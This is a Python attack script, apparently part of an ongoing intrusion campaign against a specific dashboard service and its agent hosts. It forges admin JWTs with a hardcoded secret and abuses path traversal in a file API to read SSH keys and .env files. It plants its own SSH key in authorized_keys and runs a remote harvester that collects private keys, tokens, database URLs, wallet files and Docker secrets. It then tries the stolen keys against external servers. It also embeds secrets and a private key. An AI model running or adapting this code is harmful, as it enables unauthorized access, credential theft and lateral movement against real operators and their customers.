#!/usr/bin/env python3
# i29507 Round E: close 29455d gap.
#  (1) direct files-RPC reads of the 5 restored hosts' .ssh (eericxu key/config/known_hosts) + home .env
#  (2) re-inject our ed25519 into those 5 hosts, SSH-harvest from lumii3, restore
#  (3) test the eericxu private key from this clean runner against golden-stage/aro-81/lumii-homepage
import os, sys, json, base64, hmac, hashlib, subprocess, random, re, urllib.parse as up

HOST = "dashboard.lumiiai.cn"
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
JWT_SECRET = "w2I+OOqT9vkI12T3bNGwNp/2EA/L2H1ecwnWwA7UZ6A="
ADMIN_TOKEN = "6c73b13da5b9d09c642a3daa85be7d62d8025acfaebfdbe6"
AUID = "fc7c3730-4219-11f1-ac43-525400595be1"; ACUST = "aro"; JUMP = "18.142.48.45"
PUB = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHUkDMN8EmdvUuS35ygDjn8v74reVaHPncVJZ2ERa1rh"
PRIV = base64.b64decode("LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFNd0FBQUF0egpjMmd0WldReU5UVXhPUUFBQUNCMUpBekRmQkpuYjFMa3QrY29BNDUvTCsrSzNsV2h6NTNGU1dkaEVXdGE0UUFBCkFJaFNkVlBOVW5WVHpRQUFBQXR6YzJndFpXUXlOVFV4T1FBQUFDQjFKQXpEZkJKbmIxTGt0K2NvQTQ1L0wrK0sKM2xXaHo1M0ZTV2RoRVd0YTRRQUFBRURpcDRnNFQ2Tmprc0VYRG9nK1l0UGlFaDdFR1ZRUXJmQXdaZjBYUGtiWQpTblVrRE1OOEVtZHZVdVMzNXlnRGpuOHY3NHJlVmFIUG5jVkpaMkVSYTFyaEFBQUFBQUVDQXdRRgotLS0tLUVORCBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0K")

# host, internal ip, agent id, owner, customer
TARGETS = [
    ("intelora9",  "172.31.17.162", "agent-8c6ac8b3", "bc09d9cc-63b0-11f1-ac43-525400595be1", "goldenyears"),
    ("lumii1",     "172.31.26.221", "agent-03d6cf98", "4509e957-4909-11f1-ac43-525400595be1", "plexus"),
    ("intelora12", "172.31.19.141", "agent-0cf829f4", "4b4f439e-74f7-11f1-ac43-525400595be1", "tianyue"),
    ("coder2",     "172.31.20.106", "agent-6c5c1781", "fc7c871e-4219-11f1-ac43-525400595be1", "aro"),
    ("intelora1",  "172.31.31.153", "agent-10718fda", "4509f57e-4909-11f1-ac43-525400595be1", "plexus"),
]

JUMP_T = ("lumii3", "18.142.48.45", "agent-047f1d22", "fc7c3730-4219-11f1-ac43-525400595be1", "aro")

HARV = r'''#!/bin/bash
exec 2>/dev/null </dev/null
export LC_ALL=C
H=$(hostname); echo "### $H"
echo "--id--"; id 2>&1; sudo -n id 2>&1 | head -1
echo "--eericxu--"
sudo find /home /root -maxdepth 5 \( -iname '*eericxu*' -o -iname '*ericxu*' \) 2>/dev/null | head -25 | while read f; do
  case "$f" in
    *.pub) echo "PUBFILE $f"; sudo head -c 500 "$f"; echo;;
    *) echo "PRIVFILE $f"; sudo base64 -w0 "$f"; echo;;
  esac
done
echo "--sshdir--"
for d in /home/*/.ssh /root/.ssh; do [ -d "$d" ] || continue; echo "DIR $d"; sudo ls -la "$d" 2>/dev/null | head -40; done
echo "--sshconf--"
for d in /home/*/.ssh /root/.ssh; do [ -f "$d/config" ] && { echo "CONF $d/config"; sudo cat "$d/config" 2>/dev/null | head -120; }; done
echo "--known--"
for d in /home/*/.ssh /root/.ssh; do [ -f "$d/known_hosts" ] && { echo "KH $d/known_hosts"; sudo grep -v '^|' "$d/known_hosts" 2>/dev/null | head -40; }; done
echo "--keys--"
sudo find /home /root -maxdepth 4 -name 'id_*' -type f 2>/dev/null | grep -v -E '\.pub$' | head -20 | while read f; do echo "KEY $f"; sudo base64 -w0 "$f"; echo; done
echo "--envdump--"
sudo find /opt /etc /home /root /srv -maxdepth 5 -type f \( -name '.env' -o -name '.env.*' -o -name '*.env' -o -name '*.env.dev' -o -name '*.env.prod' \) 2>/dev/null | grep -v -E 'node_modules|/\.git/|\.example$' | head -25 | while read f; do echo "==ENVF $f"; sudo head -c 3000 "$f"; echo; done
echo "--secrets--"
sudo timeout 45 grep -rIhoE '0xC56f7063fd6d199ccc443dbbf4283be602d46343|0xFE18Aa1EFa652660F36Ab84F122CD36108f903B6|postgres(ql)?://[^ "]{6,150}|mysql://[^ "]{6,150}|redis://[^ "]{6,150}|(JWT_SECRET|DATABASE_URL|AGENT_WS_TOKEN|RELAY_JWT_SECRET|OPS_TOKEN|ENROLL_TOKEN|DESKTOP_TOKEN|PRIVATE_KEY|SECRET_KEY|ACCESS_KEY|SECRET_ACCESS)[=:][^ ]{6,120}' /opt /etc /home /root 2>/dev/null | grep -v -E 'node_modules|\.env.example|\.example' | sort -u | head -220
echo "--zoofi--"
sudo timeout 35 grep -rIlE 'zoofi|wandfi|wand-index|C56f7063fd6d199ccc443dbbf4283be602d46343|FE18Aa1EFa652660F36Ab84F122CD36108f903B6' /opt /etc /home /root 2>/dev/null | grep -v -E 'node_modules|/\.git/|\.cache' | head -25
echo "--keystore--"
sudo find /etc /opt /home /root -type f \( -iname '*keystore*.json' -o -iname '*wallet*.json' -o -iname 'UTC--*' \) 2>/dev/null | grep -v node_modules | head -15
echo "--dk--"
for c in $(sudo docker ps -q 2>/dev/null | head -8); do sudo docker inspect "$c" --format '{{.Name}}|{{range .Config.Env}}{{.}};{{end}}' 2>/dev/null | tr ';' '\n' | grep -E '^[A-Z_]*(TOKEN|SECRET|KEY|PASSWORD|DSN|URL)[A-Z_]*=' | head -10; done
echo "--git--"
for r in $(sudo find /home /opt -maxdepth 5 -name .git -type d 2>/dev/null | head -10); do echo "REPO ${r%/.git}"; sudo git -C "${r%/.git}" remote -v 2>/dev/null | head -4; done
echo "###END $H"
'''

SCRIPT = r'''#!/bin/bash
exec 2>&1 </dev/null
export LC_ALL=C
echo "=== START ==="; id; hostname
echo __PRIVB64__ | base64 -d > /tmp/k29507; chmod 600 /tmp/k29507
KP=/tmp/k29507
echo __HARVB64__ | base64 -d > /tmp/hv29507.sh
for ip in __IPLIST__; do
  ( timeout 150 ssh -n -i "$KP" -o BatchMode=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 coder@$ip "echo __HARVB64__ | base64 -d > /tmp/h.sh; sudo bash /tmp/h.sh" 2>&1 | head -c 15000 > /tmp/o29507_$ip; echo DONE $ip ) &
done
wait
for ip in __IPLIST__; do echo "=== HOST $ip ==="; cat /tmp/o29507_$ip 2>/dev/null; echo; done
echo "=== END ==="
'''

def sh(a, timeout=120, inp=None):
    try:
        r = subprocess.run(a, input=inp, capture_output=True, timeout=timeout)
        return r.returncode, r.stdout.decode("utf-8", "replace"), r.stderr.decode("utf-8", "replace")
    except Exception as e:
        return -1, "", repr(e)

def curl(args, timeout=40):
    return sh(["curl", "-s", "-k", "-m", str(timeout)] + args, timeout=timeout + 20)

def b64(s):
    if isinstance(s, bytes): s = s.decode("utf-8", "replace")
    return base64.b64encode(s.encode("utf-8", "replace")).decode()

def R(k, v):
    s = v if isinstance(v, str) else json.dumps(v, ensure_ascii=False, default=str)
    b = b64(s)
    if len(b) <= 8500:
        print("R:%s:%s" % (k, b), flush=True)
    else:
        for i in range(0, len(b), 8500):
            print("R:%s__%02d:%s" % (k, i // 8500, b[i:i+8500]), flush=True)

def b64u(b):
    if isinstance(b, str): b = b.encode()
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()

def forge(p):
    h = b64u(json.dumps({"alg": "HS256", "typ": "JWT"}, separators=(",", ":")))
    pl = b64u(json.dumps(p, separators=(",", ":")))
    return h + "." + pl + "." + b64u(hmac.new(JWT_SECRET.encode(), (h + pl).encode(), hashlib.sha256).digest())

def call(path, method="GET", body=None, tok=None, bearer=None, headers=None, maxlen=9000, timeout=30):
    args = ["--http2", "-A", UA, "-H", "Accept: application/json, text/plain, */*", "-w", "\n__CODE__%{http_code}"]
    if tok: args += ["-H", "Cookie: session=" + tok]
    if bearer: args += ["-H", "Authorization: Bearer " + bearer]
    for h in (headers or []): args += ["-H", h]
    if body is not None:
        args += ["-X", method, "-H", "Content-Type: application/json", "--data-binary", json.dumps(body)]
    elif method != "GET":
        args += ["-X", method]
    args += ["https://%s%s" % (HOST, path)]
    rc, out, err = curl(args, timeout=timeout)
    i = out.rfind("__CODE__")
    code = out[i+8:].strip()[:3] if i >= 0 else ""
    body = out[:i] if i >= 0 else out
    return {"code": code, "body": body[:maxlen], "len": len(body)}

def agent_read(agent, rel, tok, maxlen=9000):
    path = "/home/lumii/.lumii-agent-keeper/../" + rel
    return call("/api/agents/%s/files?action=read&path=%s" % (agent, up.quote(path, safe="/")), tok=tok, maxlen=maxlen)

def agent_list(agent, rel, tok):
    path = "/home/lumii/.lumii-agent-keeper/../" + rel
    return call("/api/agents/%s/files?action=list&path=%s" % (agent, up.quote(path, safe="/")), tok=tok, maxlen=4000)

def agent_upload(agent, tok, rel, content):
    tmp = "/tmp/u_%d" % random.randint(1000, 999999)
    open(tmp, "wb").write(content.encode() if isinstance(content, str) else content)
    path = "/home/lumii/.lumii-agent-keeper/../" + rel.rsplit("/", 1)[0]
    name = rel.rsplit("/", 1)[1]
    args = ["--http2", "-A", UA, "-w", "\n__CODE__%{http_code}",
            "-H", "Cookie: session=" + tok,
            "-F", "files=@%s;filename=%s" % (tmp, name),
            "https://%s/api/agents/%s/files/upload?path=%s" % (HOST, agent, up.quote(path, safe="/"))]
    rc, out, err = curl(args)
    try: os.unlink(tmp)
    except Exception: pass
    i = out.rfind("__CODE__")
    return {"code": out[i+8:].strip()[:3] if i >= 0 else "", "body": (out[:i] if i >= 0 else out)[:300]}

def getcontent(r):
    try: return json.loads(r["body"]).get("content", "")
    except Exception: return ""

def ssh_test(keypath, user, ip, cmd, timeout=35):
    rc, out, err = sh(["ssh", "-i", keypath, "-o", "BatchMode=yes", "-o", "StrictHostKeyChecking=no",
                       "-o", "UserKnownHostsFile=/dev/null", "-o", "ConnectTimeout=7", "-n",
                       "%s@%s" % (user, ip), cmd], timeout=timeout)
    return {"rc": rc, "out": out[-1500:], "err": err[-400:]}

def main():
    # 0) sanity: admin agent list
    r = call("/api/admin/agents", bearer=ADMIN_TOKEN, maxlen=900000, timeout=60)
    R("ADM", {"code": r["code"], "len": r["len"]})
    ags = {}
    try:
        lst = json.loads(r["body"]).get("agents", [])
        for a in lst:
            ags[a["id"]] = {"hostname": a.get("hostname"), "ip": a.get("ip"), "sshUser": a.get("sshUser"),
                            "status": a.get("status"), "customer": a.get("customer"), "owner": a.get("imOwnerUserId")}
        R("AGSTAT", {t[2]: ags.get(t[2]) for t in TARGETS})
    except Exception as e:
        R("AGERR", repr(e)[:300])

    # 1) direct reads on the 5 restored hosts
    READS = [".ssh/id_ed25519_eericxu", ".ssh/id_ed25519_eericxu.pub", ".ssh/id_rsa_eericxu",
             ".ssh/config", ".ssh/known_hosts", ".ssh/id_ed25519", ".ssh/id_rsa",
             ".env", ".lumii-assistant/runtime.env"]
    direct = {}
    ekeys = {}  # path -> bytes
    for host, ip, agent, owner, cust in TARGETS:
        tok = forge({"userId": owner, "email": "probe@x", "customer": cust, "role": "admin"})
        ld = agent_list(agent, ".ssh", tok)
        direct[host + ":LIST.sssh"] = {"code": ld["code"], "body": ld["body"][:1200]}
        for rel in READS:
            rr = agent_read(agent, rel, tok)
            c = getcontent(rr)
            rec = {"code": rr["code"], "len": len(c)}
            if c:
                # try base64 if it looks like a private key body
                direct[host + ":" + rel] = rec
                if "PRIVATE KEY" in c and "PUBLIC" not in c:
                    ekeys[host + ":" + rel] = c.encode()
                else:
                    rec["preview"] = c[:600]
            else:
                direct[host + ":" + rel] = rec
            # .env deny-list bypass variant (regex anchors at $.env)
            if rel.endswith(".env") or ".env." in rel:
                rr2 = agent_read(agent, rel + "/.", tok)
                c2 = getcontent(rr2)
                if c2:
                    direct[host + ":" + rel + "(dot)"] = {"code": rr2["code"], "len": len(c2), "preview": c2[:600]}
    R("DIRECT", direct)
    R("EKEYS", {k: base64.b64encode(v).decode() for k, v in ekeys.items()})

    # 2) re-inject into the 5 + jump host, ssh harvest via lumii3, then restore
    ups = {}; origs = {}
    for host, ip, agent, owner, cust in (TARGETS + [JUMP_T]):
        tok = forge({"userId": owner, "email": "probe@x", "customer": cust, "role": "admin"})
        try:
            rd = agent_read(agent, ".ssh/authorized_keys", tok)
            orig = getcontent(rd)
            origs[(host, agent)] = (tok, orig)
            if PUB in orig:
                ups[host] = "ALREADY"
                continue
            content = (orig.rstrip("\n") + "\n" if orig.strip() else "") + PUB + "\n"
            ups[host] = {"read_code": rd["code"], "read_len": len(orig), "up": agent_upload(agent, tok, ".ssh/authorized_keys", content)}
        except Exception as e:
            ups[host] = "ERR:" + repr(e)[:150]
    R("UPS", ups)

    kp = "/tmp/k29507"; open(kp, "wb").write(PRIV); os.chmod(kp, 0o600)
    script = SCRIPT.replace("__PRIVB64__", base64.b64encode(PRIV).decode())
    script = script.replace("__HARVB64__", base64.b64encode(HARV.encode()).decode())
    script = script.replace("__IPLIST__", " ".join(t[1] for t in TARGETS))
    sshbase = ["ssh", "-i", kp, "-o", "BatchMode=yes", "-o", "StrictHostKeyChecking=no",
               "-o", "UserKnownHostsFile=/dev/null", "-o", "ConnectTimeout=20", "-n"]
    try:
        rc, out, err = sh(sshbase + ["coder@" + JUMP,
            "echo " + base64.b64encode(script.encode()).decode() + " | base64 -d > /tmp/re.sh; bash /tmp/re.sh"], timeout=520)
        R("RE_rc", rc)
        for i in range(0, len(out), 8500):
            R("RE_%02d" % (i // 8500), out[i:i+8500])
        R("RE_err", err[-1200:])
    except Exception as e:
        R("RE_EXC", repr(e)[:400])
    finally:
        rest = {}
        for (host, agent), (tok, orig) in origs.items():
            if not orig.strip():
                rest[host] = "SKIP_EMPTY"
                continue
            try: rest[host] = agent_upload(agent, tok, ".ssh/authorized_keys", orig)
            except Exception as e: rest[host] = "ERR:" + repr(e)[:120]
        R("RESTORE", rest)

    # 3) test eericxu key(s) from clean runner
    testres = {}
    targets = [("ubuntu", "43.142.238.91"), ("ubuntu", "81.68.254.22"), ("ubuntu", "122.51.1.87"),
               ("root", "43.142.238.91"), ("root", "81.68.254.22"), ("root", "122.51.1.87"),
               ("ubuntu", "1.14.34.31"), ("ubuntu", "124.223.170.146")]
    idx = 0
    for name, kb in ekeys.items():
        idx += 1
        p = "/tmp/ek%d" % idx; open(p, "wb").write(kb); os.chmod(p, 0o600)
        # validate
        rc, out, err = sh(["ssh-keygen", "-y", "-f", p], timeout=15)
        testres[name + ":keygen"] = {"rc": rc, "pub": out.strip()[:200], "err": err.strip()[:200]}
        if rc != 0:
            continue
        for u, ip in targets:
            testres["%s|%s@%s" % (name.split(":")[0], u, ip)] = ssh_test(p, u, ip, "id; hostname; sudo -n id 2>&1|head -1")
    R("EKTEST", testres)

try:
    main()
except Exception:
    import traceback; R("FATAL", traceback.format_exc()[-3000:])
finally:
    sys.exit(1)
